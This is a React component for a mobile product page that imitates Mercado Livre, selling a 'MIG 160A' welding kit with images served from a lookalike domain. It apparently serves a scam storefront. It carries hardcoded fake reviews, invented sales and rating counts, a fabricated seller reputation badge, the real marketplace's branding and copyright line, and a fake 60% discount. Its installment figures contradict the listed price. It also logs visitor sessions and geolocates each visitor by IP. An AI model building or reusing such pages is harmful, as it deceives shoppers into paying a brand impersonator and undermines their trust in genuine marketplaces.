import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Menu, ShoppingCart, Search, MapPin, ChevronLeft, Heart, Share2, Star, ThumbsUp, Shield, RotateCcw, Truck, Zap, ChevronDown, CreditCard, Package, MoreVertical, CheckCircle, Clock, MessageCircle, Medal } from "lucide-react";

const BASE = "https://mercadodeofertasml.shop/ml/produtos/maquinasolda/images";

const productImages = [
  `${BASE}/solda1.png`,
  `${BASE}/solda2.png`,
  `${BASE}/solda3.png`,
  `${BASE}/solda4.png`,
  `${BASE}/solda5.png`,
];

const reviews = [
  {
    name: "Robson Ferraz",
    rating: 5,
    date: "a 1 dia atrás",
    text: "Excelente kit, a máscara escurece super bem e a máquina derrete o arame liso. O esquadro ajuda muito. Recomendo!",
    photos: [`${BASE}/avali1.png`, `${BASE}/avali2.png`, `${BASE}/avali3.png`],
  },
  {
    name: "Antônio Carlos",
    rating: 5,
    date: "a 4 dias atrás",
    text: "Perfeita para minha serralheria, super leve e compacta. Muito melhor do que ficar carregando cilindro de gás.",
    photos: [`${BASE}/avali4.png`, `${BASE}/avali5.png`],
  },
  {
    name: "Marcos Paulo",
    rating: 5,
    date: "a 1 semana atrás",
    text: "Chegou super rápido, testei com o arame que veio no kit e a solda ficou com um acabamento ótimo. Pelo preço, vale cada centavo.",
    photos: [`${BASE}/avali6.png`],
  },
  {
    name: "Lucas Martins",
    rating: 4,
    date: "a 2 semanas atrás",
    text: "A máquina é valente, aguenta o tranco. O cabo da tocha poderia ser um pouquinho maior, mas atende super bem.",
    photos: [`${BASE}/avali7.png`, `${BASE}/avali8.png`, `${BASE}/avali9.png`],
  },
];

const StarsText = ({ rating }: { rating: number }) => (
  <span className="text-[#3483fa] text-sm tracking-tight">
    {"★".repeat(rating)}{"☆".repeat(5 - rating)}
  </span>
);

const paymentSlides = [
  {
    icon: <CreditCard size={36} className="text-[#3483fa]" />,
    title: "Escolha como pagar",
    desc: "Com Mercado Pago, você paga com cartão, boleto ou Pix.",
    link: "Como pagar com Mercado Pago",
  },
  {
    icon: <Package size={36} className="text-[#3483fa]" />,
    title: "Frete grátis",
    desc: "Benefício em milhares de produtos a partir de R$ 19.",
  },
  {
    icon: <Shield size={36} className="text-[#3483fa]" />,
    title: "Segurança",
    desc: "Queremos que você receba o produto que está esperando.",
  },
];

const PaymentCarousel = () => {
  const [current, setCurrent] = useState(0);
  const [touchX, setTouchX] = useState(0);

  return (
    <div>
      <div className="overflow-hidden">
        <div
          className="flex transition-transform duration-300"
          style={{ transform: `translateX(-${current * 100}%)` }}
        >
          {paymentSlides.map((item, i) => (
            <div key={i} className="min-w-full text-center px-8 py-2"
              onTouchStart={(e) => setTouchX(e.touches[0].clientX)}
              onTouchEnd={(e) => {
                const diff = touchX - e.changedTouches[0].clientX;
                if (diff > 50 && current < paymentSlides.length - 1) setCurrent(current + 1);
                if (diff < -50 && current > 0) setCurrent(current - 1);
              }}
            >
              <div className="flex justify-center mb-3">{item.icon}</div>
              <h3 className="text-[15px] font-semibold text-[#333] mb-1">{item.title}</h3>
              <p className="text-[13px] text-[#999] leading-snug">{item.desc}</p>
              {item.link && (
                <button className="text-[#3483fa] text-[13px] font-medium mt-2">{item.link}</button>
              )}
            </div>
          ))}
        </div>
      </div>
      <div className="flex justify-center gap-[6px] mt-2">
        {paymentSlides.map((_, i) => (
          <button
            key={i}
            onClick={() => setCurrent(i)}
            className={`w-[7px] h-[7px] rounded-full ${i === current ? "bg-[#3483fa]" : "bg-[#ddd]"}`}
          />
        ))}
      </div>
    </div>
  );
};

const Maquina = () => {
  const [currentImage, setCurrentImage] = useState(0);
  const [selectedVoltage, setSelectedVoltage] = useState("220V");
  const [isFavorite, setIsFavorite] = useState(false);
  const [touchStart, setTouchStart] = useState(0);
  const [userLocation, setUserLocation] = useState("sua localização");

  useEffect(() => {
    let sid = sessionStorage.getItem("checkout_session_id");
    if (!sid) { sid = crypto.randomUUID(); sessionStorage.setItem("checkout_session_id", sid); }
    supabase.from("checkout_analytics").insert({ session_id: sid, product_key: "maquina", step_reached: 0, page_visited: "index_maquina" } as any).then(() => {});
  }, []);

  useEffect(() => {
    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        if (data.region && data.country_code) {
          setUserLocation(`${data.city || data.region}, ${data.country_code}`);
        }
      })
      .catch(() => {});
  }, []);

  const handleSwipe = (direction: "left" | "right") => {
    if (direction === "left" && currentImage < productImages.length - 1) {
      setCurrentImage(currentImage + 1);
    } else if (direction === "right" && currentImage > 0) {
      setCurrentImage(currentImage - 1);
    }
  };

  return (
    <div className="min-h-screen bg-[#ededed] pb-24 max-w-[480px] mx-auto">
      {/* Header */}
      <header className="bg-[#ffe600] sticky top-0 z-50">
        <div className="flex items-center justify-between px-3 py-2">
          <Menu size={22} className="text-[#333]" />
          <img
            src="/e7b320f4-9a9c-45e1-8f2e-d116c127d186.png"
            alt="Mercado Livre"
            className="h-[34px]"
            onError={(e) => {
              (e.target as HTMLImageElement).style.display = 'none';
            }}
          />
          <ShoppingCart size={22} className="text-[#333]" />
        </div>
        <div className="px-3 pb-2">
          <div className="flex items-center bg-white rounded-full px-3 py-[7px] shadow-sm">
            <Search size={16} className="text-[#999] mr-2" />
            <span className="text-[#999] text-[14px]">Buscar produtos, muito mais...</span>
          </div>
        </div>
      </header>

      {/* Location bar */}
      <div className="bg-[#ffe600] flex items-center gap-2 px-4 py-2 text-[13px] text-[#333]/60 border-b border-[#eee]">
        <MapPin size={14} />
        <span>Enviar para {userLocation}</span>
      </div>

      <main className="bg-white">
        {/* Back link */}
        <div className="px-4 pt-3 pb-1">
          <button className="flex items-center gap-0.5 text-[#3483fa] text-[13px]">
            <ChevronLeft size={16} />
            Ir para as Ofertas
          </button>
        </div>

        {/* Product meta */}
        <div className="px-4 pb-1">
          <div className="flex items-center justify-between text-[12px] text-[#999] mb-1.5">
            <span>Novo | +5000 vendidos</span>
            <div className="flex items-center gap-1">
              <span>4.8</span>
              <span className="text-[#3483fa]">★★★★★</span>
              <span className="text-[11px]">(8.452)</span>
            </div>
          </div>
        </div>

        {/* Badges */}
        <div className="px-4 pb-2 flex items-center gap-2">
          <span className="bg-[#f73] text-white text-[10px] font-bold px-2 py-[3px] rounded-[3px] uppercase">
            Mais vendido
          </span>
          <span className="text-[12px] text-[#3483fa]">1º em Máquinas de Solda</span>
        </div>

        {/* Title */}
        <h1 className="px-4 pb-3 text-[15px] font-normal text-[#333] leading-[1.35]">
          Maquina Solda Inversora Mig Sem Gás 160a Tig Mma Trisolda Amarelo (Kit Completo)
        </h1>

        {/* Image Carousel */}
        <div
          className="relative bg-white"
          onTouchStart={(e) => setTouchStart(e.touches[0].clientX)}
          onTouchEnd={(e) => {
            const diff = touchStart - e.changedTouches[0].clientX;
            if (Math.abs(diff) > 50) handleSwipe(diff > 0 ? "left" : "right");
          }}
        >
          <div className="relative aspect-square overflow-hidden">
            <img
              src={productImages[currentImage]}
              alt={`Máquina de Solda - Imagem ${currentImage + 1}`}
              className="w-full h-full object-contain"
            />
            <div className="absolute top-3 left-3 bg-[rgba(0,0,0,0.55)] text-white text-[11px] px-2 py-0.5 rounded-full">
              {currentImage + 1}/{productImages.length}
            </div>
            <button
              onClick={() => setIsFavorite(!isFavorite)}
              className="absolute top-3 right-3 w-8 h-8 bg-white rounded-full shadow flex items-center justify-center"
            >
              <Heart
                size={18}
                className={isFavorite ? "fill-[#ff5252] text-[#ff5252]" : "text-[#3483fa]"}
              />
            </button>
            <button className="absolute bottom-3 right-3 w-8 h-8 bg-white rounded-full shadow flex items-center justify-center">
              <Share2 size={16} className="text-[#3483fa]" />
            </button>
          </div>
          <div className="flex justify-center gap-[6px] py-3">
            {productImages.map((_, i) => (
              <button
                key={i}
                onClick={() => setCurrentImage(i)}
                className={`w-[7px] h-[7px] rounded-full transition-colors ${
                  i === currentImage ? "bg-[#3483fa]" : "bg-[#ddd]"
                }`}
              />
            ))}
          </div>
        </div>

        {/* Voltage */}
        <div className="px-4 py-3 border-t border-[#eee]">
          <p className="text-[13px] text-[#666] mb-2">
            Voltagem: <strong className="text-[#333]">{selectedVoltage}</strong>
          </p>
          <div className="flex gap-2">
            {["110V", "220V"].map((v) => (
              <button
                key={v}
                onClick={() => setSelectedVoltage(v)}
                className={`px-5 py-[7px] rounded-[6px] text-[13px] border transition-colors ${
                  selectedVoltage === v
                    ? "border-[#3483fa] text-[#3483fa] bg-[#f0f6ff]"
                    : "border-[#ddd] text-[#333]"
                }`}
              >
                {v}
              </button>
            ))}
          </div>
        </div>

        {/* Price */}
        <div className="px-4 py-4">
          <p className="text-[14px] text-[#999] line-through mb-0.5">R$ 1.250,00</p>
          <div className="flex items-baseline gap-1 mb-0.5">
            <span className="text-[32px] font-light text-[#333] leading-none">
              R$ 167<span className="text-[18px] align-super">99</span>
            </span>
            <span className="text-[13px] text-[#00a650] font-semibold ml-1">60% OFF</span>
          </div>
          <div className="flex items-center text-[14px] mt-1.5">
            <CreditCard size={14} className="text-[#333] mr-1" />
            <span className="text-[#333]">em 10x de </span>
            <span className="text-[#00a650] ml-1">R$ 49,99 sem juros</span>
          </div>
          <button className="text-[#3483fa] text-[13px] mt-1.5">Ver meios de pagamento</button>
        </div>

        {/* Shipping */}
        <div className="px-4 py-3 border-t border-[#eee]">
          <span className="inline-block bg-[#00a650] text-white text-[11px] font-bold px-2 py-[3px] rounded-[3px] mb-2">
            FRETE GRÁTIS
          </span>
          <div className="flex items-center gap-1 text-[14px]">
            <span className="text-[#00a650]">Chegará grátis</span>
            <Zap size={13} className="text-[#00a650] fill-[#00a650]" />
            <span className="text-[#00a650] font-bold text-[12px]">FULL</span>
          </div>
          <p className="text-[13px] text-[#999] mt-0.5">entre sexta-feira e domingo</p>
          <button className="text-[#3483fa] text-[13px] mt-1">Mais detalhes e formas de entrega</button>
        </div>

        {/* Quantity */}
        <div className="mx-4 my-4 bg-[#f5f5f5] rounded-[6px] px-4 py-3 text-[14px] text-[#333]">
          Quantidade: <strong>1 Unidade {selectedVoltage}</strong>{" "}
          <span className="text-[#999]">(Disponível)</span>
        </div>

        {/* Buy Button */}
        <div className="px-4 pb-4">
          <a
            href="/checkout?product=maquina"
            className="block w-full bg-[#3483fa] text-white py-[14px] rounded-[6px] font-semibold text-[16px] text-center no-underline"
          >
            Comprar agora
          </a>
        </div>
      </main>

      {/* Bottom content area */}
      <div className="bg-white mt-2">
        {/* Seller Card */}
        <div className="px-4 py-4">
          <div className="flex items-center gap-3 mb-3">
            <img
              src={`${BASE}/logo_mp.svg`}
              alt="Mercado Pago"
              className="h-[36px]"
            />
            <div>
              <div className="text-[15px] font-bold text-[#333]">Mercado Líder Platinum</div>
              <div className="text-[13px] text-[#999]">Ismafer Ferramentas</div>
            </div>
          </div>
          {/* Reputation bar */}
          <div className="flex gap-[2px] mb-4">
            <div className="h-[5px] flex-1 rounded-full bg-[#ff9f9f]" />
            <div className="h-[5px] flex-1 rounded-full bg-[#ff9f9f]" />
            <div className="h-[5px] flex-1 rounded-full bg-[#ffe066]" />
            <div className="h-[5px] flex-1 rounded-full bg-[#a8d88e]" />
            <div className="h-[5px] flex-1 rounded-full bg-[#00a650]" />
          </div>
          {/* Stats row */}
          <div className="flex items-start justify-between text-center gap-3">
            <div className="flex-1">
              <div className="text-[22px] font-bold text-[#333]">+50mil</div>
              <div className="text-[11px] text-[#999] leading-tight">Vendas nos últimos 60 dias</div>
            </div>
            <div className="flex-1 flex flex-col items-center">
              <MessageCircle size={20} className="text-[#999] mb-1" />
              <div className="text-[11px] text-[#999] leading-tight">Presta bom atendimento</div>
            </div>
            <div className="flex-1 flex flex-col items-center">
              <Truck size={20} className="text-[#00a650] mb-1" />
              <div className="text-[11px] text-[#999] leading-tight">Entrega no prazo</div>
            </div>
          </div>
        </div>

        {/* Warranties */}
        <div className="px-4 py-4 border-t border-[#eee] space-y-3">
          <div className="flex items-start gap-3">
            <RotateCcw size={16} className="text-[#3483fa] shrink-0 mt-0.5" />
            <p className="text-[13px] text-[#333]">
              <span className="text-[#3483fa]">Devolução grátis.</span> Você tem 30 dias a partir da data de recebimento.
            </p>
          </div>
          <div className="flex items-start gap-3">
            <Shield size={16} className="text-[#3483fa] shrink-0 mt-0.5" />
            <p className="text-[13px] text-[#333]">
              <span className="text-[#3483fa]">Compra Garantida.</span> Receba o produto que está esperando ou devolvemos o dinheiro.
            </p>
          </div>
          <div className="flex items-start gap-3">
            <Medal size={16} className="text-[#666] shrink-0 mt-0.5" />
            <p className="text-[13px] text-[#333]">180 dias de garantia de fábrica.</p>
          </div>
        </div>
      </div>

      {/* Specs */}
      <div className="bg-white mt-2 px-4 py-4">
        <h2 className="text-[18px] font-semibold text-[#333] mb-3">
          O que você precisa saber sobre este produto
        </h2>
        <ul className="space-y-1.5 text-[14px] text-[#333] list-disc list-inside">
          <li>Tipos de máquina de solda: MIG, MMA, TIG.</li>
          <li>Amperagem máxima: 160 A.</li>
          <li>Com display digital e tecnologia inverter.</li>
          <li>Fase elétrica: Monofásica.</li>
          <li>Não utiliza gás (Arame revestido).</li>
          <li>Possui função anti stick.</li>
          <li>É kit: Inclui Máscara, Arame de 1kg e Esquadro Magnético.</li>
        </ul>
      </div>

      {/* Description */}
      <div className="bg-white mt-2 px-4 py-4">
        <h2 className="text-[18px] font-semibold text-[#333] mb-3">Descrição</h2>
        <div className="text-[14px] text-[#333] leading-[1.6] space-y-3">
          <p>
            <strong>MÁQUINA EASY MIG 160A (SEM GÁS) START SOLDAS</strong>
          </p>
          <p>
            A máquina de solda Easy MIG 160 é voltada para trabalhos pequenos e médios. Indicado para oficinas, funilarias, serralherias, pequenas indústrias, soldadores entusiastas, onde precisa de soldagem TIG, MIG e MMA.
          </p>
          <p>
            Fabricada com peso reduzido, ela reduz o esforço e a fadiga do trabalho. Com maior praticidade você consegue escolher entre os processos MMA, TIG e MIG. O modelo ainda conta com uma tocha MIG acoplada.
          </p>
          <p>
            <strong>Conteúdo da Embalagem:</strong><br />
            - 1 Máquina Easy Mig 160A<br />
            - Tocha MIG fixa de 1,70m<br />
            - Garra negativa 9mm e Porta Eletrodo<br />
            - Cabo de alimentação 1,8mts já com plug 20amp<br />
            - 1 Máscara de solda Escurecimento Automático<br />
            - 1 Arame de Solda 1kg 0.8mm Uso sem Gás<br />
            - 1 Esquadro de Solda Magnético 12Kg Start
          </p>
          <p>
            <strong>Especificações Técnicas:</strong><br />
            • Tensão de alimentação: 110V ou 220VAC<br />
            • Ciclo de trabalho: 80% @ 160A | 100% @124A<br />
            • Faixa de corrente: 10 ~ 160A<br />
            • Processos suportados: MIG, TIG(LIFT ARC), MMA<br />
            • Velocidade do arame: 2.5 à 13m/min<br />
            • Diâmetro do arame: 0.8<br />
            • Peso: 5,5kg<br />
            • Dimensão: 30x16,5x32,5cm (AxLxC)
          </p>
          <p>
            <strong>Máscara com Escurecimento Automático:</strong> Leve, com design equilibrado, protege o usuário de partículas, radiação UV e infravermelho. DIN 3 (Claro) e DIN 11 (Escuro).
          </p>
        </div>
      </div>

      {/* Reviews */}
      <div className="bg-white mt-2 px-4 py-4">
        <h2 className="text-[18px] font-semibold text-[#333] mb-3">Opiniões do produto</h2>
        <div className="flex items-center gap-2 mb-4">
          <span className="text-[36px] font-light text-[#333]">4.8</span>
          <div>
            <div className="text-[#3483fa] text-[18px] tracking-tight">★★★★★</div>
            <span className="text-[12px] text-[#999]">(8.452 avaliações)</span>
          </div>
        </div>

        <div className="space-y-0">
          {reviews.map((review, i) => (
            <div key={i} className="border-t border-[#eee] py-4">
              <div className="flex items-center gap-1.5 mb-1">
                <span className="text-[13px] text-[#333] font-medium">{review.name}</span>
                <CheckCircle size={12} className="text-[#3483fa]" />
              </div>
              <div className="flex items-center gap-2 mb-2">
                <StarsText rating={review.rating} />
                <span className="text-[11px] text-[#999]">{review.date}</span>
              </div>
              <p className="text-[13px] text-[#333] leading-[1.5] mb-2">{review.text}</p>
              {review.photos.length > 0 && (
                <div className="flex gap-2 mb-2 overflow-x-auto">
                  {review.photos.map((photo, j) => (
                    <img
                      key={j}
                      src={photo}
                      alt="Foto da avaliação"
                      className="w-[80px] h-[80px] object-cover rounded-[4px] shrink-0"
                    />
                  ))}
                </div>
              )}
              <div className="flex items-center justify-between">
                <button className="flex items-center gap-1.5 text-[12px] text-[#999] border border-[#ddd] rounded-full px-3 py-1">
                  É útil <ThumbsUp size={12} />
                </button>
                <MoreVertical size={16} className="text-[#999]" />
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Payment Methods Carousel */}
      <div className="bg-white mt-2 py-5">
        <PaymentCarousel />
      </div>

      {/* Footer Links */}
      <div className="bg-white mt-2 px-4 py-4 text-center">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-[13px] text-[#666] mb-3">
          <span>Minha conta</span>
          <span>Compras</span>
          <span>Histórico</span>
          <span>Favoritos</span>
          <span>Categorias</span>
          <span>Ofertas do dia</span>
          <span>Vender</span>
          <span>Contato</span>
        </div>
        <div className="text-[11px] text-[#999] space-y-1">
          <p>Termos e condições · Privacidade · Acessibilidade</p>
          <p>Copyright © 1999-2024 Ebazar.com.br LTDA.</p>
        </div>
      </div>

      {/* Sticky Footer */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-[#eee] px-4 py-3 z-50 max-w-[480px] mx-auto">
        <div className="flex items-center justify-between">
          <div>
            <p className="text-[15px] font-semibold text-[#333]">R$ 167,99</p>
            <p className="text-[12px] text-[#333]">10x R$ 49,99 sem juros</p>
            <p className="text-[13px] text-[#333] font-extrabold">1 Unidade {selectedVoltage}</p>
          </div>
          <a
            href="/checkout?product=maquina"
            className="bg-[#3483fa] text-white px-6 py-3 rounded-[6px] font-semibold text-[15px] no-underline"
          >
            Comprar
          </a>
        </div>
      </div>
    </div>
  );
};

export default Maquina;
